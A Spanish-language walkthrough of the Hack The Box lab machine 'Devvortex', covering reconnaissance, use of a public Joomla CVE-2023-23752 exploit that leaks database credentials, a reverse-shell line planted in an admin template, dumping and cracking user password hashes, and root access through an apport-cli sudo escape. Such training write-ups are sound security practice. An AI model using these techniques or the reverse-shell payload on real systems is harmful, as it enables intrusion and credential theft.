Maquina devvortex Hack the Box

ip: 10.10.11.242

fase de reconocimiento

❯ ping -c 1 10.10.11.242
PING 10.10.11.242 (10.10.11.242) 56(84) bytes of data.
64 bytes from 10.10.11.242: icmp_seq=1 ttl=63 time=86.5 ms

--- 10.10.11.242 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 86.524/86.524/86.524/0.000 ms


podemos definir que se trata de una maquina linux por tu ttl = 63

procedemos a escanear puertos:

❯ nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.11.242 -oG Puertos


Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-11 19:03 CST
Initiating SYN Stealth Scan at 19:03
Scanning 10.10.11.242 [65535 ports]
Discovered open port 22/tcp on 10.10.11.242
Discovered open port 80/tcp on 10.10.11.242
Completed SYN Stealth Scan at 19:03, 13.21s elapsed (65535 total ports)
Nmap scan report for 10.10.11.242
Host is up, received user-set (0.088s latency).
Scanned at 2023-12-11 19:03:35 CST for 13s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.33 seconds
           Raw packets sent: 65578 (2.885MB) | Rcvd: 65578 (2.623MB)


❯ nmap -sCV -p22,80 10.10.11.242 -oN Targeted


Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-11 19:04 CST
Nmap scan report for devvortex.htb (10.10.11.242)
Host is up (0.086s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DevVortex
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.94 seconds

whatweb 10.10.11.242

http://10.10.11.242 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.242], RedirectLocation[http://devvortex.htb/], Title[302 Found], nginx[1.18.0]

se agrega a el /etc/hosts la ip y el dominio devvortex.htb

repetimos el comando 
❯ whatweb 10.10.11.242

http://10.10.11.242 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.242], RedirectLocation[http://devvortex.htb/], Title[302 Found], nginx[1.18.0]
http://devvortex.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@DevVortex.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.242], JQuery[3.4.1], Script[text/javascript], Title[DevVortex], X-UA-Compatible[IE=edge], nginx[1.18.0]

ingresamos en nuestro navegador a: http://devvortex.htb


utilizamos la herramienta gobuster para enumerar directorios y subdominios

❯ gobuster dir -u devvortex.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://devvortex.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://devvortex.htb/images/]
/css                  (Status: 301) [Size: 178] [--> http://devvortex.htb/css/]
/js                   (Status: 301) [Size: 178] [--> http://devvortex.htb/js/]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================

gobuster vhost -u devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

gobuster dns -d devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     devvortex.htb
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: dev.devortex.htb

Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================


agregamos a el /etc/hosts el nuevo subdominio dev.devvortex.htb

realizamos con gobuster otro reconocimineto de directorios 

❯ gobuster dir -u http://dev.devvortex.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -r
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.devvortex.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git/HEAD            (Status: 403) [Size: 162]
/.cvs                 (Status: 403) [Size: 162]
/.git-rewrite         (Status: 403) [Size: 162]
/.config              (Status: 403) [Size: 162]
/.bashrc              (Status: 403) [Size: 162]
/.bash_history        (Status: 403) [Size: 162]
/.git                 (Status: 403) [Size: 162]
/.cvsignore           (Status: 403) [Size: 162]
/.cache               (Status: 403) [Size: 162]
/.git/config          (Status: 403) [Size: 162]
/.forward             (Status: 403) [Size: 162]
/.git_release         (Status: 403) [Size: 162]
/.git/index           (Status: 403) [Size: 162]
/.gitignore           (Status: 403) [Size: 162]
/.gitconfig           (Status: 403) [Size: 162]
/.gitkeep             (Status: 403) [Size: 162]
/.gitattributes       (Status: 403) [Size: 162]
/.git/logs/           (Status: 403) [Size: 162]
/.gitmodules          (Status: 403) [Size: 162]
/.gitreview           (Status: 403) [Size: 162]
/.gitk                (Status: 403) [Size: 162]
/.hta                 (Status: 403) [Size: 162]
/.history             (Status: 403) [Size: 162]
/.listing             (Status: 403) [Size: 162]
/.htaccess            (Status: 403) [Size: 162]
/.mysql_history       (Status: 403) [Size: 162]
/.htpasswd            (Status: 403) [Size: 162]
/.listings            (Status: 403) [Size: 162]
/.passwd              (Status: 403) [Size: 162]
/.profile             (Status: 403) [Size: 162]
/.perf                (Status: 403) [Size: 162]
/.rhosts              (Status: 403) [Size: 162]
/.sh_history          (Status: 403) [Size: 162]
/.ssh                 (Status: 403) [Size: 162]
/.subversion          (Status: 403) [Size: 162]
/.svn/entries         (Status: 403) [Size: 162]
/.svn                 (Status: 403) [Size: 162]
/.swf                 (Status: 403) [Size: 162]
/.svnignore           (Status: 403) [Size: 162]
/.web                 (Status: 403) [Size: 162]
/administrator        (Status: 200) [Size: 12211]
/api                  (Status: 406) [Size: 29]
/api/experiments/configurations (Status: 406) [Size: 29]
/api/experiments      (Status: 406) [Size: 29]
/cache                (Status: 200) [Size: 31]
/components           (Status: 200) [Size: 31]
/home                 (Status: 200) [Size: 23221]
/images               (Status: 200) [Size: 31]
/includes             (Status: 200) [Size: 31]
/index.php            (Status: 200) [Size: 23221]
/language             (Status: 200) [Size: 31]
/layouts              (Status: 200) [Size: 31]
/libraries            (Status: 200) [Size: 31]
/media                (Status: 200) [Size: 31]
/modules              (Status: 200) [Size: 31]
/plugins              (Status: 200) [Size: 31]
/robots.txt           (Status: 200) [Size: 764]
/templates            (Status: 200) [Size: 31]
/tmp                  (Status: 200) [Size: 31]
Progress: 4723 / 4724 (99.98%)
===============================================================
Finished
===============================================================


ingresamos a: http://dev.devvortex.htb/administrator/

podemos ver que el servicio se encuentra bajo el servicio de joomla
por lo que podemos usar joomscan

si no lo tines instalado lo hacemos con el siguiente comando sudo apt install joomscan

joomscam -u http://dev.devvortex.htb

    ____  _____  _____  __  __  ___   ___    __    _  _
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)

    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://dev.devvortex.htb ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 4.2.6

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://dev.devvortex.htb/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://dev.devvortex.htb/robots.txt

Interesting path found from robots.txt
http://dev.devvortex.htb/joomla/administrator/
http://dev.devvortex.htb/administrator/
http://dev.devvortex.htb/api/
http://dev.devvortex.htb/bin/
http://dev.devvortex.htb/cache/
http://dev.devvortex.htb/cli/
http://dev.devvortex.htb/components/
http://dev.devvortex.htb/includes/
http://dev.devvortex.htb/installation/
http://dev.devvortex.htb/language/
http://dev.devvortex.htb/layouts/
http://dev.devvortex.htb/libraries/
http://dev.devvortex.htb/logs/
http://dev.devvortex.htb/modules/
http://dev.devvortex.htb/plugins/
http://dev.devvortex.htb/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found


Your Report : reports/dev.devvortex.htb/

realizamos una busqueda en google sobre algun exploit en joomla v4.2.6 

creamos un directorio fuera de nmap llamado exploits

❯ mkdir exploits
❯ cd exploits

copiamos el siguente repositorio 
❯ git clone https://github.com/Acceis/exploit-CVE-2023-23752.git
Cloning into 'exploit-CVE-2023-23752'...
remote: Enumerating objects: 21, done.
remote: Counting objects: 100% (21/21), done.
remote: Compressing objects: 100% (17/17), done.
remote: Total 21 (delta 6), reused 15 (delta 3), pack-reused 0
Receiving objects: 100% (21/21), 74.70 KiB | 840.00 KiB/s, done.
Resolving deltas: 100% (6/6), done.
❯ ls
exploit-CVE-2023-23752

ingresamos
❯ cd exploit-CVE-2023-23752

❯ ls
assets  docker-compose.yml  exploit.rb  Gemfile  Gemfile.lock  LICENSE  README.md

instalamos la siguiente dependencia

❯ gem install httpx docopt paint

Fetching httpx-1.1.5.gem
Fetching http-2-next-1.0.1.gem
Successfully installed http-2-next-1.0.1
Successfully installed httpx-1.1.5
Parsing documentation for http-2-next-1.0.1
Installing ri documentation for http-2-next-1.0.1
Parsing documentation for httpx-1.1.5
Installing ri documentation for httpx-1.1.5
Done installing documentation for http-2-next, httpx after 2 seconds
Fetching docopt-0.6.1.gem
Successfully installed docopt-0.6.1
Parsing documentation for docopt-0.6.1
Installing ri documentation for docopt-0.6.1
Done installing documentation for docopt after 0 seconds
Fetching paint-2.3.0.gem
Successfully installed paint-2.3.0
Parsing documentation for paint-2.3.0
Installing ri documentation for paint-2.3.0
Done installing documentation for paint after 0 seconds
4 gems installed

ejecutamos el exploit de la siguiente manera:

❯ ruby exploit.rb http://dev.devvortex.htb
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered
[651] Roan (rnt) - qweqwe@qew.com - Super Users

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0


obtenemos el siguiente usuario y contrasena:

user: lewis
password: P4ntherg0t1n5r3c0n##

creamos la reverse shell con el siguiente comando en el archivo login.php

ubicado en system/administrator templates/atum

system('bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"');

realizamos un cat al etc/passwd para ver los usuarios

www-data@devvortex:~/dev.devvortex.htb/administrator$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
fwupd-refresh:x:113:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
logan:x:1000:1000:,,,:/home/logan:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false

revisamos el directorio home

www-data@devvortex:~/dev.devvortex.htb/administrator$ ls -la /home
ls -la /home
total 12
drwxr-xr-x  3 root  root  4096 Sep 26 19:16 .
drwxr-xr-x 19 root  root  4096 Oct 26 15:12 ..
drwxr-xr-x  3 logan logan 4096 Nov 21 11:04 logan

www-data@devvortex:~/dev.devvortex.htb/administrator$ ls
ls
cache
components
help
includes
index.php
language
logs
manifests
modules
templates

www-data@devvortex:~/dev.devvortex.htb/administrator$ cd templates
www-data@devvortex:~/dev.devvortex.htb/administrator/templates$ ls
atum
system

www-data@devvortex:~/dev.devvortex.htb/administrator/templates$ cd atum
www-data@devvortex:~/dev.devvortex.htb/administrator/templates/atum$ ls
component.php
cpanel.php
error.php
error_full.php
error_login.php
html
index.php
joomla.asset.json
login.php
templateDetails.xml

www-data@devvortex:~/dev.devvortex.htb/administrator/templates/atum$

ingresamos el siguiente comando para genera una seudo terminal con python:

python3 -c "import pty;pty.spawn('/bin/bash')"

ingresamos a mysql 

mysql -u lewis -p joomla --password=P4ntherg0t1n5r3c0n##

mysql> show tables;
show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |
| sd4fg_action_logs_extensions  |
| sd4fg_action_logs_users       |
| sd4fg_assets                  |
| sd4fg_associations            |
| sd4fg_banner_clients          |
| sd4fg_banner_tracks           |
| sd4fg_banners                 |
| sd4fg_categories              |
| sd4fg_contact_details         |
| sd4fg_content                 |
| sd4fg_content_frontpage       |
| sd4fg_content_rating          |
| sd4fg_content_types           |
| sd4fg_contentitem_tag_map     |
| sd4fg_extensions              |
| sd4fg_fields                  |
| sd4fg_fields_categories       |
| sd4fg_fields_groups           |
| sd4fg_fields_values           |
| sd4fg_finder_filters          |
| sd4fg_finder_links            |
| sd4fg_finder_links_terms      |
| sd4fg_finder_logging          |
| sd4fg_finder_taxonomy         |
| sd4fg_finder_taxonomy_map     |
| sd4fg_finder_terms            |
| sd4fg_finder_terms_common     |
| sd4fg_finder_tokens           |
| sd4fg_finder_tokens_aggregate |
| sd4fg_finder_types            |
| sd4fg_history                 |
| sd4fg_languages               |
| sd4fg_mail_templates          |
| sd4fg_menu                    |
| sd4fg_menu_types              |
| sd4fg_messages                |
| sd4fg_messages_cfg            |
| sd4fg_modules                 |
| sd4fg_modules_menu            |
| sd4fg_newsfeeds               |
| sd4fg_overrider               |
| sd4fg_postinstall_messages    |
| sd4fg_privacy_consents        |
| sd4fg_privacy_requests        |
| sd4fg_redirect_links          |
| sd4fg_scheduler_tasks         |
| sd4fg_schemas                 |
| sd4fg_session                 |
| sd4fg_tags                    |
| sd4fg_template_overrides      |
| sd4fg_template_styles         |
| sd4fg_ucm_base                |
| sd4fg_ucm_content             |
| sd4fg_update_sites            |
| sd4fg_update_sites_extensions |
| sd4fg_updates                 |
| sd4fg_user_keys               |
| sd4fg_user_mfa                |
| sd4fg_user_notes              |
| sd4fg_user_profiles           |
| sd4fg_user_usergroup_map      |
| sd4fg_usergroups              |
| sd4fg_users                   |
| sd4fg_viewlevels              |
| sd4fg_webauthn_credentials    |
| sd4fg_workflow_associations   |
| sd4fg_workflow_stages         |
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
+-------------------------------+
71 rows in set (0.00 sec)

mysql> select * from sd4fg_users;
select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params
    | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2023-12-13 15:26:31 | 0          |
    | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)

creamos un directorio llamado content
y creamos un archivo llamado hash en el cual guardamos los hash que obtuvimos
con la herramienta john crackeamos la contrasena

└─# john hash --wordlist=/usr/share/wordlist/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (?)
1g 0:00:00:03 DONE (2023-12-13 10:20) 0.2710g/s 390.2p/s 390.2c/s 390.2C/s winston..michel
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

ingresamos por medio de ssh

ssh logan@10.10.11.242
The authenticity of host '10.10.11.242 (10.10.11.242)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.242' (ED25519) to the list of known hosts.
logan@10.10.11.242's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 13 Dec 2023 04:31:38 PM UTC

  System load:           0.0
  Usage of /:            64.5% of 4.76GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             174
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.242
  IPv6 address for eth0: dead:beef::250:56ff:feb9:d420

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Dec 13 15:05:05 2023 from 10.10.16.10

obtenemos ingreso al sistema:
logan@devvortex:~$ ls
user.txt

y la flag del usuario

a partir de aqui se escalan privilegios

logan@devvortex:~$ sudo -l
[sudo] password for logan:
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli

logan@devvortex:~$ sudo /usr/bin/apport-cli --help
Usage: apport-cli [options] [symptom|pid|package|program path|.apport/.crash file]

Options:
  -h, --help            show this help message and exit
  -f, --file-bug        Start in bug filing mode. Requires --package and an
                        optional --pid, or just a --pid. If neither is given,
                        display a list of known symptoms. (Implied if a single
                        argument is given.)
  -w, --window          Click a window as a target for filing a problem
                        report.
  -u UPDATE_REPORT, --update-bug=UPDATE_REPORT
                        Start in bug updating mode. Can take an optional
                        --package.
  -s SYMPTOM, --symptom=SYMPTOM
                        File a bug report about a symptom. (Implied if symptom
                        name is given as only argument.)
  -p PACKAGE, --package=PACKAGE
                        Specify package name in --file-bug mode. This is
                        optional if a --pid is specified. (Implied if package
                        name is given as only argument.)
  -P PID, --pid=PID     Specify a running program in --file-bug mode. If this
                        is specified, the bug report will contain more
                        information.  (Implied if pid is given as only
                        argument.)
  --hanging             The provided pid is a hanging application.
  -c PATH, --crash-file=PATH
                        Report the crash from given .apport or .crash file
                        instead of the pending ones in /var/crash. (Implied if
                        file is given as only argument.)
  --save=PATH           In bug filing mode, save the collected information
                        into a file instead of reporting it. This file can
                        then be reported later on from a different machine.
  --tag=TAG             Add an extra tag to the report. Can be specified
                        multiple times.
  -v, --version         Print the Apport version number.
logan@devvortex:~$ sudo /usr/bin/apport-cli -v
2.20.11

aprovechamos una vulneravilidad en sudo con el siguiente comando:

logan@devvortex:~$ sudo /usr/bin/apport-cli -c test.log less

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
.................

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (1.7 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V

seleccionamos V

escribimos el sigiente comando:

!/bin/bash

y obtenemos acceso a root

root@devvortex:/home/logan# cd /root
root@devvortex:~# ls
root.txt

aca obtenemos la falg de root

y terminariamos la maquina.

https://www.hackthebox.com/achievement/machine/926397/577
